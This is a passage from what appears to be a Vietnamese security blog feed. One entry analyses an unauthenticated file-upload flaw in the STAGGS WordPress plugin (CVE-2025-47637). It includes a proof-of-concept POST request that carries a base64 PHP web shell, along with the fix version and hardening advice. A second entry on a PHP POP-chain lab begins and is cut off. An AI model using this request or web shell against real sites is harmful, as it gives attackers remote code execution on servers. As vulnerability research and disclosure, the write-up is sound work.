title=&#34;Tạo Product bằng plugin&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/product.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Product&lt;/h2&gt;&lt;p&gt;Tạo Product bằng plugin&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/product.png&#39; alt=&#34;Create Product&#34; height=&#34;685&#34; width=&#34;1039&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo Product bằng plugin&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce.png&#34; title=&#34;Nonce lấy từ response&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce lấy từ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;682&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce lấy từ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Nếu &lt;code&gt;nonce&lt;/code&gt; hợp lệ, tiếp tục kiểm tra &lt;code&gt;$_POST[&#39;image_id&#39;]&lt;/code&gt; có tồn tại hay không, nếu có:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy &lt;code&gt;image name&lt;/code&gt; tức tên của &lt;strong&gt;product title&lt;/strong&gt; (theo mô tả: &lt;code&gt;// image name based on product title.&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;store_final_product_image()&lt;/code&gt; để lưu ảnh và lấy URL trả về&lt;/li&gt;&#xA;&lt;li&gt;Trả về phản hồi JSON chứa &lt;code&gt;image_url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function store_final_product_image( $imagename, $data, $options, $main_image = true) {&#xA;  if ( preg_match( &amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type ) ) {&#xA;    // Valid base64 image.&#xA;    $data = substr( $data, strpos($data, &amp;#39;,&amp;#39;) &amp;#43; 1 );&#xA;    $type = strtolower( $type[1] ); // jpg, png, gif&#xA;&#xA;    $data = str_replace( &amp;#39; &amp;#39;, &amp;#39;&amp;#43;&amp;#39;, $data );&#xA;    $data = base64_decode($data);&#xA;  &#xA;    if ( $data === false ) {&#xA;      throw new \Exception(&amp;#39;Image decode failed. Try again.&amp;#39;);&#xA;    }&#xA;  } &#xA;  ...&#xA;  $upload_dir = wp_get_upload_dir();&#xA;  $base_dir   = $upload_dir[&amp;#39;basedir&amp;#39;];&#xA;&#xA;  // Allow different location.&#xA;  $save_path  = apply_filters( &amp;#39;staggs_image_save_dir&amp;#39;, $base_dir . &amp;#39;/staggs&amp;#39; );&#xA;  if ( ! file_exists( $save_path ) ) {&#xA;    mkdir( $save_path, 0777, true );&#xA;  }&#xA;  if ( $main_image ) {&#xA;    // Main product image.&#xA;    if ( is_array( $options ) &amp;amp;&amp;amp; count( $options ) &amp;gt; 0 ) {&#xA;      $filename = $imagename . &amp;#39;-&amp;#39; . md5( wp_json_encode( $options ) ) . &amp;#39;.&amp;#39; . $type;&#xA;    } else {&#xA;      $filename = $imagename . &amp;#39;.&amp;#39; . $type;&#xA;    }&#xA;  } &#xA;  ...&#xA;  // Always override in case something went wrong earlier&#xA;  file_put_contents( $save_path . &amp;#34;/{$filename}&amp;#34;, $data );&#xA;  $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );&#xA;  return $image_path_url . &amp;#34;/{$filename}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lệnh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;preg_match(&amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dùng để kiểm tra xem biến &lt;code&gt;$data&lt;/code&gt; có phải là chuỗi ảnh ở định dạng &lt;strong&gt;Base64 Data URI&lt;/strong&gt; &lt;em&gt;hay không.&lt;/em&gt;&#xA;Cụ thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;^data:image\/&lt;/code&gt; → chuỗi phải bắt đầu bằng &lt;code&gt;data:image/&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;(.*)&lt;/code&gt; → lấy phần định dạng ảnh (ví dụ: &lt;code&gt;png&lt;/code&gt;, &lt;code&gt;jpeg&lt;/code&gt;, &lt;code&gt;gif&lt;/code&gt;, …)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;;base64,&lt;/code&gt; → tiếp theo phải có chuỗi &lt;code&gt;;base64,&lt;/code&gt; (báo hiệu dữ liệu ảnh được mã hóa Base64)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu khớp, mảng &lt;code&gt;$type&lt;/code&gt; sẽ chứa thông tin định dạng ảnh, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$type[1] = &amp;#39;png&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu không khớp, tức &lt;code&gt;$data&lt;/code&gt; &lt;strong&gt;không phải là dữ liệu ảnh Base64 hợp lệ&lt;/strong&gt;, hàm trả về &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau đó &lt;code&gt;$type&lt;/code&gt; được gán giá trị của &lt;code&gt;$type[1]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ta có thể truyền &lt;code&gt;$data=data:image/php;base64...&lt;/code&gt; để &lt;code&gt;$type[1] =&#39;php&#39;&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;if ( is_array( $options ) &amp;amp;&amp;amp; count( $options ) &amp;gt; 0 ) {&#xA;  $filename = $imagename . &amp;#39;-&amp;#39; . md5( wp_json_encode( $options ) ) . &amp;#39;.&amp;#39; . $type;&#xA;} else {&#xA;  $filename = $imagename . &amp;#39;.&amp;#39; . $type;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;$options&lt;/code&gt; không được truyền thì &lt;code&gt;$filename&lt;/code&gt; sẽ có dạng &lt;code&gt;product_title.$type&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng, file được lưu bằng hàm &lt;code&gt;file_put_contents()&lt;/code&gt; và trả về URL đẫn tới nó&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;file_put_contents( $save_path . &amp;#34;/{$filename}&amp;#34;, $data );&#xA;$image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );&#xA;return $image_path_url . &amp;#34;/{$filename}&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls&amp;#34;] --&amp;gt; B[&amp;#34;staggs_get_configuration_form_urls_ajax()&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;wp_verify_nonce() valid?&amp;#34;}&#xA;C -- No --&amp;gt; Z[&amp;#34;Return empty JSON&amp;#34;]&#xA;C -- Yes --&amp;gt; D{&amp;#34;isset($_POST[&amp;#39;image_id&amp;#39;])?&amp;#34;}&#xA;D -- No --&amp;gt; Z&#xA;D -- Yes --&amp;gt; E[&amp;#34;store_final_product_image($image_name, $_POST[&amp;#39;image&amp;#39;], $_POST[&amp;#39;values&amp;#39;], true)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;preg_match(&amp;#39;/^data:image\/(.*);base64,/&amp;#39;, $data, $type) ?&amp;#34; }&#xA;F -- No --&amp;gt; Z&#xA;F -- Yes --&amp;gt; G[&amp;#34;$type = strtolower($type[1]); base64_decode($data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Lấy nonce từ mã nguồn trả về&lt;/li&gt;&#xA;&lt;li&gt;Gửi POST request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=staggs_get_configuration_form_urls&amp;amp;nonce=f281c84283&amp;amp;image_id=1&amp;amp;image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với &lt;code&gt;PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==&lt;/code&gt; mã hóa base64 của &lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/request.png&#34; title=&#34;Request với Web Shell payload&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request với Web Shell payload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/request.png&#39; alt=&#34;Request&#34; height=&#34;413&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request với Web Shell payload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Truy cập URL trả về và RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-11-cve-2025-47637/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-11-cve-2025-47637/result.png&#39; alt=&#34;Result&#34; height=&#34;589&#34; width=&#34;1533&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng cho phép &lt;strong&gt;unauthenticated&lt;/strong&gt; kẻ tấn công tải lên file tùy ý (ví dụ web shell) thông qua endpoint AJAX của plugin STAGGS do thiếu xác thực kiểu file trước khi lưu. Kẻ tấn công có thể lấy &lt;code&gt;nonce&lt;/code&gt; từ mã nguồn công khai, gửi &lt;code&gt;data:&lt;/code&gt; URI giả mạo (vd. &lt;code&gt;data:image/php;base64,...&lt;/code&gt;) và tạo file PHP trên máy chủ, dẫn tới RCE. Vấn đề đã được khắc phục trong phiên bản &lt;strong&gt;2.12.0&lt;/strong&gt; bằng cách giới hạn phần mở rộng được chấp nhận (png, jpg, jpeg, gif).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lỗ hổng bắt nguồn từ &lt;strong&gt;không kiểm tra hợp lệ kiểu/đuôi file&lt;/strong&gt; trước khi lưu; kiểm tra client-side/regex không đủ nếu không ràng buộc phần mở rộng và nội dung thực tế.&lt;/li&gt;&#xA;&lt;li&gt;Không để endpoint quan trọng cho phép hành động upload chạy ở chế độ &lt;strong&gt;nopriv (unauthenticated)&lt;/strong&gt; nếu không có cơ chế xác thực và hạn chế chặt.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; chèn trong mã nguồn có thể bị thu thập và tái sử dụng — không dựa chỉ vào nonce hiển thị công khai để ngăn thao tác nhạy cảm.&lt;/li&gt;&#xA;&lt;li&gt;Cần validate cả &lt;strong&gt;MIME type&lt;/strong&gt;, &lt;strong&gt;phần mở rộng&lt;/strong&gt;, và (nếu có thể) kiểm tra nội dung thực tế của file trên server; lưu file upload ở vị trí không thể thực thi hoặc chuyển đổi thành non-executable.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật plugin lên &lt;strong&gt;&amp;gt;= 2.12.0&lt;/strong&gt; ngay lập tức; kiểm tra site cho các file khả nghi trong thư mục upload &lt;code&gt;staggs/&lt;/code&gt; nếu site chạy phiên bản cũ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/staggs/vulnerability/wordpress-staggs-2-10-1-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress STAGGS Plugin &amp;lt;= 2.11.0 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>POP Chain Analysis &amp; Exploit</title>
      <link>http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/</link>
      <pubDate>Tue, 11 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-11-pop-chain-lab1/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;intro&#34;&gt;&lt;span&gt;Intro&lt;/span&gt;&#xA;  &lt;a href=&#34;#intro&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong quá trình nghiên cứu &lt;strong&gt;Insecure Deserialization&lt;/strong&gt;, mình nhận được một lab liên quan đến &lt;strong&gt;POP Chain&lt;/strong&gt; (Property-Oriented Programming Chain). Đây là một dạng tấn công thú vị: thay vì khai thác hàm hay lệnh trực tiếp, kẻ tấn công kết hợp các &lt;em&gt;gadget&lt;/em&gt; (các phương thức magic của class) để đạt được mục tiêu — ví dụ thực thi lệnh hệ thống (RCE).&lt;/p&gt;&#xA;&lt;p&gt;Bài viết này mô tả quá trình mình phân tích và khai thác lab: từ xem qua mã nguồn, nhận diện các gadget hữu dụng, tới cách xây payload để kích hoạt chuỗi gọi (POP chain). Mục tiêu là giúp bạn hiểu được phương pháp tư duy khi xử lý lab kiểu này.&lt;/p&gt;&#xA;&lt;p&gt;Lab mình thực hiện:&#xA;&lt;a href=&#34;https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;tổng-quan-mã-nguồn&#34;&gt;&lt;span&gt;Tổng quan mã nguồn&lt;/span&gt;&#xA;  &lt;a href=&#34;#t%e1%bb%95ng-quan-m%c3%a3-ngu%e1%bb%93n&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;class User{&#xA;&#x9;public $name;&#xA;&#x9;private $memo;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function __wakeup(){&#xA;&#x9;&#x9;$this-&amp;gt;memo=new Note($this -&amp;gt; name.&amp;#34;say hello&amp;#34;, &amp;#39;test_whale&amp;#39;);&#xA;&#x9;}&#xA;&#x9;function __get($content){&#xA;&#x9;&#x9;return $this-&amp;gt;memo;&#xA;&#x9;}&#xA;}&#xA;class Note{&#xA;&#x9;public $content;&#xA;&#x9;public $whale;&#xA;&#x9;function __construct($content, $whale){&#xA;&#x9;&#x9;$this-&amp;gt;content=$content;&#xA;&#x9;&#x9;$this-&amp;gt;whale=$whale;&#xA;&#x9;}&#xA;&#x9;function __toString(){&#xA;&#x9;&#x9;$this-&amp;gt;record($this-&amp;gt;whale, $this-&amp;gt;content);&#xA;&#x9;&#x9;return &amp;#39;Record for &amp;#39;.$this-&amp;gt;whale.&amp;#39; is : &amp;#39;.$this-&amp;gt;content;&#xA;&#x9;}&#xA;&#x9;function record($whale, $content){&#xA;&#x9;&#x9;//check whether it&amp;#39;s an attribute&#xA;&#x9;&#x9;$test=$whale-&amp;gt;$content;&#xA;&#x9;&#x9;if ($test!=NULL){&#xA;&#x9;&#x9;&#x9;echo(&amp;#34;It&amp;#39;s probably an attribute&amp;#34;);&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&#xA;class Whale{&#xA;&#x9;public $name;&#xA;&#x9;private $note;&#xA;&#x9;function __construct($name){&#xA;&#x9;&#x9;$this-&amp;gt;name=$name;&#xA;&#x9;}&#xA;&#x9;function take_note($note){&#xA;&#x9;&#x9;$this-&amp;gt;note=date(&amp;#34;Y/m/d H:i:s&amp;#34;).$note;&#xA;&#x9;}&#xA;&#x9;function 